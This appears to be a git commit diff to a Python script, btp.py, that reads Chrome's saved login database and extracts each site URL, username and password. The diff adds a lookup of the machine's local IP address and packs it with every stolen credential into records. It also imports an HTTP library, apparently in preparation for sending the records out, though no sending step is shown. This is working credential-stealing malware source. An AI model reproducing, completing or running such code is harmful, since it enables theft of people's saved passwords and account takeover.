556742f0709a032571f1fca389a5d820d0ee3181
Michael Assanama <66501418+macbotxxx@users.noreply.github.com>
2023-12-06 23:36:19 +0100

    Update btp.py

--- btp.py
+++ btp.py
@@ -1,12 +1,56 @@
 # imports 
+import requests
 import os 
 import sqlite3
 import shutil
 import csv
+import socket
 # windows os 
 # import win32crypt
 
+# def get_country_from_ip(ip_address):
+#     try:
+#         # Make a request to the ipinfo.io API
+#         response = requests.get(f'https://ipinfo.io/{ip_address}/json')
+        
+#         # Check if the request was successful (status code 200)
+#         if response.status_code == 200:
+#             ip_data = response.json()
+            
+#             # Extract the country information
+#             country = ip_data.get('country', 'Country information not available')
+            
+#             return country
+#         else:
+#             return f'Error: {response.status_code}'
+#     except requests.RequestException as e:
+#         return f'Error: {e}'
 
+# Replace '8.8.8.8' with the IP address you want to look up
+# ip_address_to_lookup = '8.8.8.8'
+# country = get_country_from_ip(ip_address_to_lookup)
+
+# print(f'The country for IP address {ip_address_to_lookup} is: {country}')
+
+def get_local_ip():
+    try:
+        # Get the local hostname
+        host_name = socket.gethostname()
+
+        # Get the local IP address
+        local_ip = socket.gethostbyname(host_name)
+
+        return local_ip
+    except socket.error as e:
+        print(f"Error: {e}")
+        return None
+
+local_ip = get_local_ip()
+
+if local_ip:
+    print(f"Local IP address: {local_ip}")
+else:
+    print("Unable to retrieve local IP address.")
 
 def get_chrome():
     # windows os 
@@ -20,23 +64,26 @@ def get_chrome():
     login_data = cursor.fetchall()
     cred = {}
     string = ""
-    print(login_data)
+    data_record = []
     for url , user_name , pwd in login_data:
-        print(pwd)
-        print(pwd[1])
         # windoes os
         # pwd = win32crypt.CryptUnprotectData(pwd)
         # cred[url] = (user_name, pwd[1].decode("utf-8"))
 
         cred[url] = (user_name, pwd.decode("latin-1"))
         string += "\n[+] URL:%s \n USERNAME:%s \n PASSWORD:%s\n" % (url, user_name, pwd.decode("latin-1"))
-        print(string)
 
-        # with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
-        #     csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-        #     csv_writer.writerow(["index","url","username","password"])
-        #     csv_writer.writerow([index,url,username,decrypted_password])
+        data = {
+            "ipadress_data": local_ip,
+            "url_data":url,
+            "username_data":user_name,
+            "password_data":pwd.decode("latin-1")
+        }
 
+        data_record.append(data)
+
+     
+    print(data_record)
 
 if __name__ == "__main__":
     get_chrome()
